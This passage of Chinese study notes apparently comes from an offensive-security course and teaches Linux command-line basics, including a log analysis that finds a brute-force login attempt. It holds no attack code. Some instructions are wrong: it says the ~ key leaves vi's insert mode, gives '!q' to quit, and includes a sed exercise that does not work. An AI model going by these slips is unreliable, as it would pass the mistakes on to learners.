操作符前加上流编号来做到这一点（2=STDERR）。\n\n</aside>\n\n### 管道符\n\n继续使用 wc 命令的例子，让我们看看如何将一个命令的输出重定向到另一个命令的输入。请看这个例子：\n\n```bash\nkali@kali:~$ cat error.txt\nls: cannot access '/test': No such file or directory\n\nkali@kali:~$ cat error.txt | wc -m\n53\n\nkali@kali:~$ cat error.txt | wc -m > count.txt\n\nkali@kali:~$ cat count.txt\n53\n```\n\n我们使用管道符 `|` 将 cat 命令的输出重定向到 wc 命令的输入。这个概念看起来很微不足道，但将不同的命令用管道连接起来是一个强大的工具，可以操作各种数据。\n\n## 文本搜索和操作\n\n可以通过几个命令来提高文件和文本处理的效率： grep、sed、cut 和 awk。对其中一些工具的高级使用需要对正则匹配式（regex）的工作原理有一个很好的理解。正则表达式是一个特殊的文本字符串，用于描述搜索模式。\n\n正则表达式学习网址：\n\n> https://www.regular-expressions.info/\n\n> http://www.rexegg.com/\n\n### Grep\n\ngrep 搜索文本文件中出现的给定的正则表达式，并将包含匹配结果的任何一行输出到标准输出，这通常是终端屏幕。一些最常用的选项包括用于递归搜索的 `-r` 和用于忽略文本大小写的 `-i` 。例子：\n\n```bash\nkali@kali:~$ ls -la /usr/bin | grep zip\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bunzip2\n-rwxr-xr-x 3 root root 34480 Jan 29 2017 bzip2\n-rwxr-xr-x 1 root root 13864 Jan 29 2017 bzip2recover\n-rwxr-xr-x 2 root root 2301 Mar 14 2016 gunzip\n-rwxr-xr-x 1 root root 105172 Mar 14 2016 gzip\n```\n\n用 ls 列出了 /usr/bin 目录下的所有文件，并将输出结果输入到 grep 命令，该命令搜索包含了 “zip” 字符串的任何一行。了解 grep 工具以及何时使用它可以证明是非常有用的。\n\n### Sed\n\nsed 是一个强大的流编辑器。它也是非常复杂的，所以我们在这里只简单地介绍一下它的表面。在一个非常高的水平上，sed 在一个文本流上执行文本编辑，可以是一组特定的文件或标准输出。让我们看一个例子：\n\n```bash\nkali@kali:~$ echo \"I need to try hard\" | sed 's/hard/harder/'\nI need to try harder\n```\n\n在列表中，我们用 echo 命令创建了一个文本流，然后将其输出到 sed，以便将 “hard” 替换为 “harder”。注意，在默认情况下，输出已被重定向到标准输出。\n\n### Cut\n\ncut 命令很简单，但经常派上用场。它用于从一行中提取一段文本，并将其输出到标准输出。一些最常用的选项包括： `-f` 表示我们要剪切的字段编号， `-d` 表示字段分隔符。\n\n```bash\nkali@kali:~$ echo \"I hack binaries,web apps,mobile apps, and just about anything else\"| cut -f 2 -d \",\"\nweb apps\n```\n\n我们呼出了一行文本，并将其输送到 cut 命令中，用逗号（,）作为字段分隔符提取第二个字段。同样的命令可以用于文本文件中的行，如下所示，通过使用冒号（:）作为分隔符和检索第一个字段，从 /etc/passwd 中提取了一个用户列表：\n\n```bash\nkali@kali:~$ cut -d \":\" -f 1 /etc/passwd\nroot\ndaemon\nbin\nsys\nsync\ngames\n...\n```\n\n### Awk\n\nawk 是一种为文本处理而设计的编程语言，通常被用作数据提取和报告工具。它的功能也非常强大，可以说是相当复杂，所以我们在这里只介绍一下表面情况。awk 的一个常用选项是： `-F` ，它是字段分隔符，而 print 命令则是输出结果文本。\n\n```bash\nkali@kali:~$ echo \"hello::there::friend\" | awk -F \"::\" '{print $1, $3}'\nhello friend\n```\n\n我们输出了一行，并把它输送给 awk，用 “::” 作为字段分隔符提取第一个 （$1）和第三个（$3）字段。我们使用的 cut 和 awk 例子之间最突出的区别是，cut 只接受一个字符作为字段分隔符，而 awk 则要灵活的都多。作为一个一般的经验法则，当你开始有一个涉及多个剪切操作的命令时，你可能要考虑该用 awk。\n\n### 实例\n\n我们得到了一个 Apache HTTP 服务器日志（http://www.offensive-security.com/pwk-files/access_log.txt.gz），它包含了一个攻击的证据。我们的任务是使用 Bash 命令来检查该文件，并发现各种信息，例如谁是攻击者和服务器上到底发生了什么。\n\n首先，我们将使用 head 和 wc 命令快速浏览一下日志文件，了解其结构。head 命令显示文件中的前10行，而 wc 命令，连同 `-l` 选项，显示文件中的总行数。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# gunzip access_log.txt.gz                                                           9 ⨯\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─# mv access_log.txt access.log                   \n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# head access.log \n201.21.152.44 - - [25/Apr/2013:14:05:35 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"-\" \"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.64 Safari/537.31\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 2553 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:48 -0700] \"GET /include/main.css HTTP/1.1\" 304 - \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:49 -0700] \"GET /images/menu/2ny.png HTTP/1.1\" 200 2732 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"www.random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /chicago/ HTTP/1.1\" 200 7451 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:58 -0700] \"GET /include/jquery.js HTTP/1.1\" 304 - \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:10:59 -0700] \"GET /images/header.png HTTP/1.1\" 200 13610 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n70.194.129.34 - - [25/Apr/2013:14:11:00 -0700] \"GET /favicon.ico HTTP/1.1\" 404 89 \"<http://random-site.com/chicago/>\" \"Mozilla/5.0 (Linux; U; Android 4.1.2; en-us; SCH-I535 Build/JZO54K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30\" \"random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:13 -0700] \"GET / HTTP/1.1\" 200 4135 \"<http://startuplife.fi/you-know-you-are-in-san-francisco-when-your-favorite-spare-time-activities-include-eating-or-drinking/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n88.112.192.2 - - [25/Apr/2013:14:11:14 -0700] \"GET /include/jquery.jshowoff.min.js HTTP/1.1\" 200 6227 \"<http://www.random-site.com/>\" \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.65 Safari/537.31\" \"www.random-site.com\"\n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# wc -l access.log \n1173 access.log\n```\n\n请注意，该日志文件是基于文本的，包含不同的字段（IP地址、时间戳、HTTP 请求等），并以空格为界。这是一个完美的 “grep 友好型”文件，对于我们到目前为止所涉及的所有工具都能很好地工作。我们将首先搜索这个日志文件中记录的所有 IP 地址向服务器发出的 HTTP 请求。我们将通过管道将 cat 命令的输出输入到 cut 和 sort 命令中来完成这一工作。这可能会给我们提供一个线索，告诉我们需要处理的潜在攻击者的数量。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|cut -d \" \" -f 1|sort -u\n201.21.152.44\n208.115.113.91\n208.54.80.244\n208.68.234.99\n70.194.129.34\n72.133.47.242\n88.112.192.2\n98.238.13.253\n99.127.177.95\n```\n\n我们看到，在日志文件中记录的 IP 地址不到十个，尽管这仍然不能告诉我们关于攻击者的任何信息。接下来，我们使用 uniq 和 sort 来显示唯一的行，进一步细化我们的输出，并按每个 IP 地址访问服务器的次数来排序。uniq 的 `-c` 选项将在输出行前加上出现的次数。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|cut -d \" \" -f 1|sort|uniq -c|sort -urn\n   1038 208.68.234.99\n     59 208.115.113.91\n     22 208.54.80.244\n     21 99.127.177.95\n      8 70.194.129.34\n      1 201.21.152.44\n```\n\n有几个 IP 地址很突出，但我们将首先关注访问频率最高的地址。为了过滤掉 208.67.234.99 这个地址，并显示和计算该 IP 所请求的资源，我们可以使用下面的序列。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|cut -d \"\\\\\"\" -f 2|uniq -c\n   1038 GET //admin HTTP/1.1\n```\n\n从这个输出结果来看，208.68.234.99 的 IP 地址似乎在专门访问 /admin 目录。让我们进一步检查一下。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|grep '/admin'|sort -u   \n208.68.234.99 - - [22/Apr/2013:07:51:20 -0500] \"GET //admin HTTP/1.1\" 401 742 \"-\" \"Teh Forest Lobster\"\n208.68.234.99 - admin [22/Apr/2013:07:51:25 -0500] \"GET //admin HTTP/1.1\" 200 575 \"-\" \"Teh Forest Lobster\"\n                                                                                                                                                                                                                    \n┌──(root💀kali)-[~/Desktop]\n└─# cat access.log|grep '208.68.234.99'|grep -v '/admin'\n```\n\n显然，208.68.234.99 已经参与了针对这个网络服务器的 HTTP 暴力攻击尝。此外，在大约 1000 次尝试之后，似乎蛮力尝试成功了，正如 “HTTP 200” 信息所显示的那样。\n\n### 练习\n\n1. 使用 /etc/passwd，提取 kali 机器上所有用户的用户和主目录字段，这些用户的 shell 被设置为 /bin/false。确保你使用 Bash 单行代码来打印输出到屏幕上。输出应该类似于下面的样式\n\n   ```bash\n   kali@kali:~$ YOUR COMMAND HERE...\n   The user mysql home directory is /nonexistent\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /var/run/speech-dispatcher\n   The user Debian-gdm home directory is /var/lib/gdm3\n   ```\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# awk -F: '$NF == \"/bin/false\" { printf(\"The user %s home directory is %s\\\\n\", $1, $6)}' /etc/passwd\n   The user mysql home directory is /nonexistent\n   The user tss home directory is /var/lib/tpm\n   The user Debian-snmp home directory is /var/lib/snmp\n   The user speech-dispatcher home directory is /run/speech-dispatcher\n   The user lightdm home directory is /var/lib/lightdm\n   ```\n\n2. 将 /etc/passwd 文件复制到你的主目录（/home/kali）\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# cp /etc/passwd /home/kali                                             \n                                                                                                                                                                                                                       \n   ┌──(root💀kali)-[~/Desktop]\n   └─# ls /home/kali \n   Desktop  Documents  Downloads  Music  passwd  Pictures  Public  Templates  Videos\n   ```\n\n3. 在单行程序中使用 cat 来打印 /kali/passwd 的输出，并将 “Gnome Display Manager” 字符串的所有实例替换为 “GDM”\n\n   ```bash\n   ┌──(root💀kali)-[~/Desktop]\n   └─# cat /etc/passwd|sed 's/\"Gnome Display Manager\"/GDM/'                                     \n   root:x:0:0:root:/root:/usr/bin/zsh\n   daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n   bin:x:2:2:bin:/bin:/usr/sbin/nologin\n   sys:x:3:3:sys:/dev:/usr/sbin/nologin\n   sync:x:4:65534:sync:/bin:/bin/sync\n   games:x:5:60:games:/usr/games:/usr/sbin/nologin\n   man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n   lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n   mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n   news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n   uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n   proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n   www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n   backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n   list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n   irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\n   gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n   nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n   _apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n   systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin\n   systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\n   systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\n   mysql:x:104:110:MySQL Server,,,:/nonexistent:/bin/false\n   tss:x:105:111:TPM software stack,,,:/var/lib/tpm:/bin/false\n   strongswan:x:106:65534::/var/lib/strongswan:/usr/sbin/nologin\n   ntp:x:107:112::/nonexistent:/usr/sbin/nologin\n   messagebus:x:108:113::/nonexistent:/usr/sbin/nologin\n   redsocks:x:109:114::/var/run/redsocks:/usr/sbin/nologin\n   rwhod:x:110:65534::/var/spool/rwho:/usr/sbin/nologin\n   iodine:x:111:65534::/run/iodine:/usr/sbin/nologin\n   miredo:x:112:65534::/var/run/miredo:/usr/sbin/nologin\n   _rpc:x:113:65534::/run/rpcbind:/usr/sbin/nologin\n   usbmux:x:114:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin\n   tcpdump:x:115:121::/nonexistent:/usr/sbin/nologin\n   rtkit:x:116:122:RealtimeKit,,,:/proc:/usr/sbin/nologin\n   sshd:x:117:65534::/run/sshd:/usr/sbin/nologin\n   statd:x:118:65534::/var/lib/nfs:/usr/sbin/nologin\n   postgres:x:119:124:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash\n   avahi:x:120:126:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin\n   stunnel4:x:121:127::/var/run/stunnel4:/usr/sbin/nologin\n   Debian-snmp:x:122:128::/var/lib/snmp:/bin/false\n   speech-dispatcher:x:123:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false\n   sslh:x:124:129::/nonexistent:/usr/sbin/nologin\n   nm-openvpn:x:125:130:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin\n   nm-openconnect:x:126:131:NetworkManager OpenConnect plugin,,,:/var/lib/NetworkManager:/usr/sbin/nologin\n   pulse:x:127:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin\n   saned:x:128:135::/var/lib/saned:/usr/sbin/nologin\n   inetsim:x:129:137::/var/lib/inetsim:/usr/sbin/nologin\n   colord:x:130:138:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin\n   geoclue:x:131:139::/var/lib/geoclue:/usr/sbin/nologin\n   lightdm:x:132:140:Light Display Manager:/var/lib/lightdm:/bin/false\n   king-phisher:x:133:141::/var/lib/king-phisher:/usr/sbin/nologin\n   kali:x:1000:1000:Kali,,,:/home/kali:/usr/bin/zsh\n   systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin\n   dnsmasq:x:134:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin\n   uuidd:x:135:145::/run/uuidd:/usr/sbin/nologin\n   redis:x:136:146::/var/lib/redis:/usr/sbin/nologin\n   ```\n\n## 从命令行到编辑文件\n\n接下来，让我们来看看在命令 Shell 环境下的文件编辑。这是一项及其重要的 Linux 技能，特别是在渗透测试中，如果你碰巧进入了一个类似 Unix 的操作系统。\n\n虽然有一些文本编辑器，如 gedit 和 leafpad，由于其图形用户界面，可能在视觉上更吸引人，但我们将专注于文本的终端编辑器，它既强调速度又强调多功能性。\n\n说到文本编辑器，每个人似乎都有自己的偏好，但我们将介绍两个最常见的选项的基本使用方法：nano 和 vi。\n\n### Nano\n\nnano 是最简单易用的文本编辑器之一。要打开一个文件并开始编辑，只需运行nano，将文件名作为一个可选参数。\n\n```bash\nkali@kali:~$ nano intro_to_nano.txt\n```\n\n一旦文件被打开，我们可以立即开始对文件进行任何必要的修改，就像我们在图形编辑器中一样。在一个图形编辑器中的做法。如下图所示。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/6484aa3a-8ca3-4f81-bc85-fbeabdca3833/Untitled.png)\n\n命令菜单位于屏幕的底部，需要记住的一些最常用的命令包括： `Ctrl` `O` 将修改内容写到文件， `Ctrl` `K` 剪切选中内容， `Ctrl` `U` 粘贴剪切或复制的内容， `Ctrl` `W` 搜索， `Ctrl` `X` 退出。\n\n### Vi\n\nvi 是一个及其强大的文本编辑器，能够以极快的速度运行，特别是当涉及到自动化重复性任务时。然而，它的学习曲线比较陡峭，使用起来远不如 Nano 简单。由于它的复杂性，我们将只介绍最基本的内容。与 Nano 一样，要编辑一个文件，只需将其名称作为参数传给 Vi。\n\n```bash\nkali@kali:~$ vi intro_to_vi.txt\n```\n\n一旦文件被打开，启用插入文本模式开始输入。要做到这一点，按 `i` 键并开始打字。\n\n要禁用插入文本模式并返回到命令模式，请按 `~` 键。在命令模式下，使用 `dd` 删除当前行， `yy` 复制当前行， `p` 粘贴剪切板内容， `x` 删除当前字符， `:w` 将当前文件写入磁盘并停留在 vi 中， `!q` 不将文件写入磁盘就退出， `wq` 保存并退出\n\n由于 vi 看起来很笨拙，许多用户避免使用它。然而，从渗透测试者的角度来看，**vi** 在一个有经验的用户手中可以节省大量的时间，并且 vi 被安装在每一个符合 POSIX 标准的系统上。\n\n请随意自己深入挖掘，vi 的功能相当强大。欲了解更多信息，请参考以下网址：\n\n> https://en.wikibooks.org/wiki/Learning_the_vi_Editor/vi_Reference\n\n> https://www.debian.org/doc/manuals/debian-tutorial/ch-editor.html\n\n## 比较文件\n\n文件比较可能看起来无关紧要，但系统管理员、网络工程师、渗透测试人员、IT 支持技术人员和许多其他以技术为导向的专业人员经常依赖这种技能。\n\n### Comm\n\ncomm 命令对两个文本文件进行比较，显示每个文件特有的行，以及它们的共同性行。它输出三列空间便宜：第一列包含第一个文件或参数所特有的行；第二列包含第二个文件或参数所特有的行；第三列包含两个文件共有的行。选项 `-n` ，其中 “n” 是1、2 或 3，可以用来抑制一个或多个列，取决于需要，让我们看一个例子：\n\n```bash\nkali@kali:~$ cat scan-a.txt\n192.168.1.1\n192.168.1.2\n192.168.1.3\n192.168.1.4\n192.168.1.5\n\nkali@kali:~$ cat scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n192.168.1.6\n\nkali@kali:~$ comm scan-a.txt scan-b.txt                \n                192.168.1.1\n192.168.1.2\n                192.168.1.3\n                192.168.1.4\n                192.168.1.5\n        192.168.1.6\n\nkali@kali:~$ comm -12 scan-a.txt scan-b.txt\n192.168.1.1\n192.168.1.3\n192.168.1.4\n192.168.1.5\n```\n\n在第一个例子中，comm 分别显示了 scan-a.txt 中的第一行、scan-b.txt 中的伟一行以及两个文件夹中发现的行。正在第二个例子中，comm -12 只显示在两个文件夹中发现的行，因为我们抑制了第一和第二列。\n\n### Diff\n\ndiff 命令用于检测文件之间的差异，类似于 comm 命令。然而，diff 要复杂得多，支持许多输出格式。两个最流行的格式包括上下文格式（-c）和统一格式（-u）。\n\n```bash\nkali@kali:~$ diff -c scan-a.txt scan-b.txt\n*** scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n--- scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n***************\n*** 1,5 ****\n  192.168.1.1\n- 192.168.1.2\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n--- 1,5 ----\n  192.168.1.1\n  192.168.1.3\n  192.168.1.4\n  192.168.1.5\n+ 192.168.1.6\nkali@kali:~$ diff -u scan-a.txt scan-b.txt\n--- scan-a.txt  2022-03-16 21:27:48.331470356 -0400\n+++ scan-b.txt  2022-03-16 21:27:57.663470846 -0400\n@@ -1,5 +1,5 @@\n 192.168.1.1\n-192.168.1.2\n 192.168.1.3\n 192.168.1.4\n 192.168.1.5\n+192.168.1.6\n```\n\n输出中使用 “-” 指示器显示该行出现在第一个文件中，但没有出现在第二个文件中。反之，“+” 指示器显示该行出现在第二个文件中，但没有出现在第一个文件中。\n\n这些格式之间最明显的区别是，统一格式不显示文件之间匹配的行，使结果更短。在这两种格式中，指标的含义是相同的。\n\n### Vimdiff\n\nvimdiff 用多个文件打开 vim，每个窗口都有一个。文件之间的差异被高亮显示，这使得视觉上的检查更加容易。有几个快捷键可能是有用的，比如说：\n\n- do：把另一个窗口中的改动放到当前窗口中。\n- dp：把当前窗口中的变化放到另一个窗口中。\n- ]c：跳转到下一个变化。\n- [c：跳转到上一个变化。\n- `Ctrl` `W` ：切换到另一个分割窗口。\n\n我们来看看一个例子：\n\n```bash\nkali@kali:~$ vimdiff scan-a.txt scan-b.txt\n```\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/edea1d22-8812-4aac-bcd1-94721633a2f2/Untitled.png)\n\n## 管理进程\n\nLinux 内核通过使用进程来管理多任务。内核维护每个进程的信息以帮助保持事情的条理性，每个进程都被分配了一个编号，称为进程 ID（PID）。\n\nLinux Shell 还引入了作业的概念，以简化用户在终端会话中的工作流程。例如 cat error|wc -m 是两个进程的流水线，Shell 将其视为一个作业。作业控制是指有选择地暂停作业的执行，并在以后的时间恢复其执行的能力。这可以通过特定的命令来实现，我们很快就会探讨这个问题。\n\n### 背景进程（bg）\n\n本模块中以前的工作都是在前台运行的，这意味着终端被占用，在当前工作完成之前不能执行其他命令。由于我们的大多数例子都是短小精悍的，所以这并没有造成什么问题。然而，我们将在后面的模块中运行更长、更复杂的命令，我们可以将这些命令发送到后台，以便重新获得对终端的控制权并执行更多的命令。将一个进程转入后台的最快方法是在命令的末尾加上一个安倍号（&），在它启动后立即将其发送到后台。让我们试试一个简单的例子。\n\n```bash\nkali@kali:~$ ping -c 400 localhost > ping_results.txt &\n```\n\n我们用 ping 命令向本地接口发送了 400 个 ICMP 回波请求，并将结果写入一个名为 ping_results.txt 的文件。执行过程自动在后台运行，使 shell 可以自由地进行其他操作。\n\n但是，如果我们忘了在命令的末尾加上安倍号，会发生什么呢？该命令将在前台运行，我们将被迫用 `Ctrl` `C` 取消该命令，或者等到该命令结束后重新获得对终端的控制。另一个选择是在作业已经开始后用 `Ctrl` `Z` 暂停作业。一旦作业被暂停，我们可以通过使用 bg 命令在后台恢复它。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─# bg                                                                           148 ⨯ 1 ⚙\n[1]  + continued  ping -c 400 localhost > ping_results.txt\n                                                                                           \n┌──(root💀kali)-[~/Desktop]\n└─#\n```\n\n工具现在在后台运行，我们可以继续按照我们意愿使用终端。在这样做的时候，请记住，有些进程是对时间敏感的，如果暂停时间过长，可能会给出不正确的结果。例如，在 ping 的例子中，echo 回复可能会回来，但如果数据包进行时进程被暂停，进程可能会错过它，导致不正确的输出。在进行作业控制时，要始终考虑你正在运行的命令的背景。\n\n### 工作控制：jobs 和 fg\n\n为了快速检查我们的 ICMP 回波请求的状态，我们需要使用两个额外的命令：jobs 和 fg。\n\n内置的 jobs 工具列出了当前终端会话中正在运行的工，而 fg 则将一个工作返回到前台。下面是这些命令的操作。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─#  ping -c 400 localhost > ping_results.txt\n^Z\nzsh: suspended  ping -c 400 localhost > ping_results.txt\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# find / -name sbd.exe                                                                    \n^Z\nzsh: suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# jobs                                                                                    \n[1]  - suspended  ping -c 400 localhost > ping_results.txt\n[2]  + suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# fg %1                                                                                   \n[1]  - continued  ping -c 400 localhost > ping_results.txt\n^C                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# jobs                                                                                    \n[2]  + suspended  find / -name sbd.exe\n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─# fg                                                                                      \n[2]  - continued  find / -name sbd.exe\n/usr/share/windows-resources/sbd/sbd.exe\n```\n\n首先，奇特的 **^C** 字符代表按键组合 `Ctrl` `C` 。我们可以使用这个快捷键来中止一个长期运行的进程，重新获取对终端的控制。\n\n第二，在 **fg %1** 命令中使用 “%1” 是新的。 在 shell 中，有多种方法来指代一项工作。“%” 字符后面跟着一个 jobID，代表一个工作规范。jobID 可以是一个进程 ID（PID）号码，或者你可以使用以下符号组合。\n\n- %Number：指的是一个工作编号，如 %1 或 %2\n- %String：指的是暂停的命令名称的开头，如 %commandNameHere 或 %ping\n- %+ 或 %%：指的是当前的工作\n- %-：指的是前一个工作\n\n<aside> 💡 如果只有一个进程被置入后台，则不需要工作编号。\n\n</aside>\n\n### 进程控制：ps 和 kill\n\n在大多数类似 Unix 的操作系统中，监视进程最有用的命令之一是 ps（进程状态的简称）。与 jobs 命令不同，ps 列出了全系统的进程，而不仅仅是当前的终端会话。这个工具被认为是类 Unix 操作系统的标准，它的名字被广泛认可，甚至在 Windows PoweShell 中，ps 也是 Get-Process cmdlet 的预定义命令别名，它的作用基本相同。\n\n作为一个渗透测试人员，在获得对系统的远程访问后，首先要检查的是了解被攻击机器上目前正在运行什么软件。这可以帮助我们提升我们的权限或收集更多的信息，以获得对网络的新一步访问。\n\n作为一个例子，让我们启动 Leafpad 文件编辑器，然后尝试使用 ps 命令从命令行中找到其进程 ID（PID）。\n\n```bash\nkali@kali:~$ ps -ef\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot           1       0  0 10:18 ?       00:00:02 /sbin/init\nroot           2       0  0 10:18 ?       00:00:00 [kthreadd]\nroot           3       2  0 10:18 ?       00:00:00 [rcu_gp]\nroot           4       2  0 10:18 ?       00:00:00 [rcu_par_gp]\nroot           5       2  0 10:18 ?       00:00:00 [kworker/0:0-events]\nroot           6       2  0 10:18 ?       00:00:00 [kworker/0:0H-kblockd]\nroot           7       2  0 10:18 ?       00:00:00 [kworker/u256:0-events_unbound\nroot           8       2  0 10:18 ?       00:00:00 [mm_percpu_wq]\nroot           9       2  0 10:18 ?       00:00:00 [ksoftirqd/0]\nroot          10       2  0 10:18 ?       00:00:00 [rcu_sched]\n```\n\n我们上面使用的 **-ef** 选项代表了：\n\n- e：选择所有进程\n- f：显示完整的格式列表（UID，PID，PPID，等等）\n\n在这个庞大的列表中找到我们 Leafpad 应用程序绝对不容易，但由于我们知道我们正在寻找的应用程序名称，我们可以使用 -c（按命令名称选择）代替 -e 选项，如下：\n\n```bash\nkali@kali:~$ ps -fC leafpad\nUID          PID    PPID  C STIME TTY          TIME CMD\nroot       56551   56371  1 23:22 pts/0    00:00:00 leafpad\n```\n\n进程搜索返回了一个结果，我们从中收集了 Leafpad 的 PID。花些时间来探索命令手册（man ps），因为 ps 确实是进程管理的瑞士军刀。\n\n假设我们选择想在不同与 GUI 交互的情况下停止 Leafpad 进程。kill 命令在这里可以帮助我们，因为它的目的是向一个进程发送一个特定的信号。为了使用 kill，我们需要我们想发送信号的进程的 PID。由于我们在上一步中收集了 Leafpad 的 PID，我们可以继续。\n\n```bash\n┌──(root💀kali)-[~/Desktop]\n└─# kill 56551                                             \n                                                                                            \n┌──(root💀kali)-[~/Desktop]\n└─#  ps aux | grep leafpad\nroot       56596  0.0  0.0   7616   884 pts/1    S+   23:27   0:00 grep --color=auto leafpad\n```\n\n因为 kill 的默认信号是 SIGTERM（请求终止），我们的应用程序已经被终止了。通过杀死 Leafpad 后使用 ps 验证了这一点。\n\n## 文件和命令监控\n\n在渗透测试过程中，知道如何实时监控文件和命令是非常有价值的。两个有助于完成此类任务的命令是 tail 和 watch。\n\n### Tail\n\ntail 最常见的用途是监视正在写入的日志文件条目。例如，我们可能想监视 Apache 的日志，看看一个 Web 服务器是否被我们试图通过客户端攻击的特定客户联系到。这个例子就可以做到这一点：\n\n```bash\nkali@kali:~$ sudo tail -f /var/log/apache2/access.log\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET / HTTP/1.1\" 200 3380 \"-\" \"Mozilla/5.0\n(X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:14 -0500] \"GET /icons/openlogo-75.png HTTP/1.1\" 200\n6040 \"<http://127.0.0.1/>\" \"Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101\nFirefox/52.0\"\n127.0.0.1 - - [02/Feb/2018:12:18:15 -0500] \"GET /favicon.ico HTTP/1.1\" 404 500 \"-\"\n\"Mozilla/5.0 (X11; 